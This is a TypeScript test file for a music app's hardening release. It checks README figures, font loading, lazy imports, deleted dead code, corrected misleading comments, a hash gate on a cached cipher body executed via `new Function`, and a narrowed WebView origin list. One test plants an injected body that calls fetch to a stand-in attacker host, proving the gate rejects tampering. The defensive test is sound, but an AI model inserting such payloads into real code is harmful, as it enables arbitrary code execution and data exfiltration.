/**
 * WAVE D LOCKS — v5.2.1 FIX-D1 … FIX-D7 (documentation, P2s, cleanup).
 *
 *  D1 · the README QA row no longer carries interleaved stale fragments;
 *      the docs-truth law pins the REAL measured numerals.
 *  D2 · the six Figtree TTFs (~160 KB) are OUT of the eager font load
 *      (zero consumers); the files stay.
 *  D3 · AIScreen rides a LOCAL React.lazy Wire — the static import pulled
 *      the whole MindbeatWireScreen chunk into the eager bundle and
 *      defeated the Wave A A3 split on this route.
 *  D4 · the AmbientBackdrop component (documented "sits behind the tab
 *      screens", rendered NOWHERE) is DELETED — dead code and a doc claim
 *      the app never kept. (Honest choice over mounting: mounting ships a
 *      full-screen visual change in a hardening release with no device-lab
 *      verification; deletion ships the truth.)
 *  D5 · the comment lies are corrected: deps.ts claimed "safety-filtered"
 *      on a function that never filtered; surfaces.test.ts claimed Mixes
 *      v2 coverage it never had. The decadeRadio/moodJourney
 *      reconcileRecordings claims were VERIFIED TRUE (mindbeat.ts calls it
 *      in both bodies — the audit misread) and are now BACKED by a
 *      per-body source law; lrclib's "LRU-30" became true in FIX-C2.
 *  D6 · the cipher cache carries an FNV-1a body hash; a tampered KV body
 *      never reaches `new Function` (the arbitrary-code-execution class).
 *  D7 · ytPoToken's WebView originWhitelist is the three Google origins
 *      the minter actually needs — not ['*'].
 *
 * Mutations proven RED (worklog V5.2.1-WAVE-D): M-D1-1/2, M-D2-1/2,
 * M-D3-1/2, M-D4-1/2, M-D5-1/2, M-D6-1/2, M-D7-1/2 — every one restored
 * byte-exact.
 */

import { describe, expect, test, afterAll, mock } from 'bun:test';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { rnMockSurface } from './helpers/rnMockSurface';

mock.module('react-native', () => rnMockSurface());
mock.module('@react-native-async-storage/async-storage', () => ({
  default: {
    getItem: async () => null,
    setItem: async () => undefined,
    removeItem: async () => undefined,
    multiRemove: async () => undefined,
  },
}));

const SRC = join(import.meta.dir, '..', 'src');
const REPO = join(import.meta.dir, '..');
const read = (...p: string[]) => readFileSync(join(SRC, ...p), 'utf8');
const readRepo = (...p: string[]) => readFileSync(join(REPO, ...p), 'utf8');

/** Code, not documentation (the waveA lesson — a lie in a comment must
 *  never fail a law, and a law must never pass on a comment). */
function stripComments(src: string): string {
  const out: string[] = [];
  let inBlock = false;
  for (const line of src.split('\n')) {
    let l = line;
    if (inBlock) {
      const end = l.indexOf('*/');
      if (end === -1) {
        out.push('');
        continue;
      }
      l = l.slice(end + 2);
      inBlock = false;
    }
    l = l.replace(/\/\*[^]*?\*\//g, ' ');
    const open = l.indexOf('/*');
    if (open !== -1) {
      l = l.slice(0, open);
      inBlock = true;
    }
    l = l.replace(/(^|[^:])\/\/.*$/, '$1');
    out.push(l);
  }
  return out.join('\n');
}

const { BoundedMap } = await import('../src/api/boundedMap');
const cipher = await import('../src/api/ytCipherCache');
const { saveCipherCache, loadCipherCache, cipherCacheKey } = cipher;
type CipherCacheDeps = import('../src/api/ytCipherCache').CipherCacheDeps;

// ── D1 — the README tells the measured truth ───────────────────────────
describe('FIX-D1 — the QA row is one honest line, not interleaved fragments', () => {
  test('the exact stale interleaving is gone', () => {
    const readme = readRepo('README.md');
    expect(readme).not.toContain('1,071 tests (885 replay suite + 186 improvement-arc & wave locks) · 4,808 assertions wave locks');
    expect(readme).not.toContain('187 improvement-arc 1,071 tests');
  });

  test('the row carries the measured numerals (docs-truth law)', () => {
    const readme = readRepo('README.md');
    expect(readme).toContain('1,143 tests');
    expect(readme).toContain('5,217 assertions');
    expect(readme).toContain('573 replay suite + 570 improvement-arc & hardening locks');
  });
});

// ── D2 — Figtree is out of the eager load ──────────────────────────────
describe('FIX-D2 — the 160 KB of dead Figtree fonts do not ride cold start', () => {
  test('source law: App.tsx loads NO Figtree family', () => {
    const app = stripComments(readRepo('App.tsx'));
    expect(app.includes('Figtree'), 'App.tsx still eagerly loads Figtree').toBeFalse();
  });

  test('source law: the files stay on disk (kept for a future surface)', () => {
    const theme = stripComments(read('theme.ts'));
    expect(theme).toContain("figtreeRegular: 'Figtree-400'"); // the reserved names survive
  });
});

// ── D3 — the Wire is lazy on the AI route too ──────────────────────────
describe('FIX-D3 — AIScreen no longer statically imports the Wire', () => {
  test('source law: no top-level MindbeatWireScreen import in AIScreen', () => {
    const src = stripComments(read('screens', 'AIScreen.tsx'));
    expect(src).not.toMatch(/import\s+\{\s*MindbeatWireScreen\s*\}\s+from/);
  });

  test('source law: the Wire arrives through React.lazy instead', () => {
    const src = stripComments(read('screens', 'AIScreen.tsx'));
    expect(src).toContain("React.lazy(() =>\n  import('./MindbeatWireScreen')");
    expect(src).toContain('<Suspense'); // the fallback is wired
  });
});

// ── D4 — AmbientBackdrop is deleted, not silently dead ─────────────────
describe('FIX-D4 — the never-rendered AmbientBackdrop is GONE (code + docs)', () => {
  test('source law: no AmbientBackdrop export or component remains', () => {
    const src = stripComments(read('theme', 'DynamicThemeProvider.tsx'));
    expect(src.includes('AmbientBackdrop'), 'AmbientBackdrop still exists').toBeFalse();
    expect(src.includes('AmbientLayer'), 'the AmbientLayer half still exists').toBeFalse();
  });

  test('source law: no other module renders it either', () => {
    const provider = read('theme', 'DynamicThemeProvider.tsx');
    // the header doc no longer claims the wash "sits behind the tab screens"
    expect(provider).not.toContain('sits behind the tab screens');
  });
});

// ── D5 — the comment lies are corrected (and the true claims are BACKED) ─
describe('FIX-D5 — comments match reality', () => {
  // NOTE — these laws read the RAW source DELIBERATELY: D5's fixes ARE the
  // comments, so the comment is the product here (the waveA "code not docs"
  // rule governs laws about CODE; a doc-truth law that strips docs checks
  // nothing — proven by M-D5-1 surviving the stripped version).
  test('deps.ts no longer claims safety filtering it never did', () => {
    const src = read('ai', 'surfaces', 'deps.ts');
    expect(src).not.toContain('Safety-filtered, playable, non-preview candidates');
  });

  test('surfaces.test.ts no longer claims Mixes v2 coverage it never had', () => {
    const src = readRepo('tests', 'ai', 'surfaces.test.ts');
    expect(src).not.toMatch(/✓ Mixes v2: 60\/25\/15 split \+ ≤30% yesterday repeat(?! \(MUTATION)/);
    expect(src).not.toContain('✓ Mixes v2: 60/25/15 split + ≤30% yesterday repeat');
  });

  test('the decadeRadio reconcileRecordings claim is BACKED by the facade body', () => {
    // The audit called this a lie; verification says the facade DOES it —
    // so the law backs the claim instead of deleting it.
    const mindbeat = stripComments(read('ai', 'mindbeat.ts'));
    const from = mindbeat.indexOf('async decadeRadio(');
    const to = mindbeat.indexOf('async tasteDnaCode(');
    expect(mindbeat.slice(from, to)).toContain('reconcileRecordings');
  });

  test('the moodJourney reconcileRecordings claim is BACKED by the facade body', () => {
    const mindbeat = stripComments(read('ai', 'mindbeat.ts'));
    const from = mindbeat.indexOf('async moodJourney(');
    const to = mindbeat.indexOf('async resumeSession(');
    expect(mindbeat.slice(from, to)).toContain('reconcileRecordings');
  });

  test('lrclib: the "LRU-30" claim is now TRUE (FIX-C2 made it so)', () => {
    const src = stripComments(read('api', 'lrclib.ts'));
    expect(src).toContain('ORIGIN_CACHE_CAP = 30');
  });
});

// ── D6 — the cipher cache integrity gate ───────────────────────────────
describe('FIX-D6 — a tampered cipher body never reaches new Function', () => {
  const mem = new Map<string, string>();
  const deps: CipherCacheDeps = {
    getRaw: async (k) => mem.get(k) ?? null,
    setRaw: async (k, v) => {
      mem.set(k, v);
    },
    now: () => 1_000_000,
  };

  test('save → load round-trips when the body is untouched', async () => {
    mem.clear();
    await saveCipherCache(deps, '/s/player/abc/base.js', 'var a=1; return a;');
    const loaded = await loadCipherCache(deps, '/s/player/abc/base.js');
    expect(loaded?.body).toBe('var a=1; return a;');
  });

  test('a tampered body fails the hash gate → the fetch path answers', async () => {
    mem.clear();
    await saveCipherCache(deps, '/s/player/abc/base.js', 'var a=1; return a;');
    // THE ATTACK: the untrusted KV is edited between save and load
    const key = cipherCacheKey('/s/player/abc/base.js');
    const entry = JSON.parse(mem.get(key)!);
    entry.body = 'fetch("https://evil.example/"+s); return s;'; // arbitrary-code injection
    mem.set(key, JSON.stringify(entry));
    const loaded = await loadCipherCache(deps, '/s/player/abc/base.js');
    expect(loaded).toBeNull(); // the gate refuses — the caller fetches fresh
  });

  test('a legacy entry WITHOUT a hash is refused too (upgrade-safe)', async () => {
    mem.clear();
    mem.set(
      cipherCacheKey('/s/player/old/base.js'),
      JSON.stringify({ jsPath: '/s/player/old/base.js', body: 'var x=2; return x;', expiresAt: 9_999_999 }),
    );
    const loaded = await loadCipherCache(deps, '/s/player/old/base.js');
    expect(loaded).toBeNull();
  });

  test('a wrong-path entry is still refused (the pre-existing law holds)', async () => {
    mem.clear();
    await saveCipherCache(deps, '/s/player/a/base.js', 'var a=1; return a;');
    expect(await loadCipherCache(deps, '/s/player/b/base.js')).toBeNull();
  });

  test('source law: the integrity gate sits BEFORE the caller ever evals', () => {
    const src = stripComments(read('api', 'ytCipherCache.ts'));
    expect(src).toContain('bodyHash: fnv1a(body)'); // save stamps it
    expect(src).toContain('if (entry.bodyHash !== fnv1a(entry.body)) return null;'); // load gates it
  });
});

// ── D7 — the WebView origin surface is exactly the three Google origins ─
describe('FIX-D7 — the po-token WebView whitelist is the minimal origin set', () => {
  test('source law: the exact three origins, never [*]', () => {
    const src = stripComments(read('api', 'ytPoToken.tsx'));
    expect(src).toContain(
      "originWhitelist={['https://www.youtube.com', 'https://youtube.com', 'https://jnn-pa.googleapis.com']}",
    );
    expect(src.includes("originWhitelist={['*']}"), "the wildcard whitelist is back").toBeFalse();
  });
});

// shared-module hygiene: BoundedMap still answers for later files
describe('wave D shared-module sanity', () => {
  test('BoundedMap still evicts (the C2/C3 law is untouched by D edits)', () => {
    const m = new BoundedMap<string, number>(2);
    m.set('a', 1);
    m.set('b', 2);
    m.set('c', 3);
    expect(m.size).toBe(2);
    expect(m.has('a')).toBeFalse();
  });
});
